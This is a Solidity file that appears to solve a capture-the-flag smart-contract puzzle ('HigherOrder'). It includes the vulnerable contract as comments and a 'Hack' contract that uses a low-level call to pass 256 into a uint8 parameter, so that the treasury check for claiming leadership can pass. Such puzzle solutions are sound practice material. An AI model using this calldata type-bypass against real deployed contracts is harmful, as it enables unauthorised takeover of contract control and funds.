// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// contract HigherOrder {
//     address public commander;
//
//     uint256 public treasury;
//
//     function registerTreasury(uint8) public {
//         assembly {
//             sstore(treasury_slot, calldataload(4))
//         }
//     }
//
//     function claimLeadership() public {
//         if (treasury > 255) commander = msg.sender;
//         else revert("Only members of the Higher Order can become Commander");
//     }
// }

interface IHigherOrder {
    function commander() external view returns (address);

    function treasury() external view returns (uint256);

    function claimLeadership() external;
}

contract Hack {
    function hack(address target) external {
        bytes memory payload = abi.encodeWithSignature(
            "registerTreasury(uint8)",
            256
        );
        (bool success, ) = target.call(payload);
        require(success, "Registration failed");
    }
}
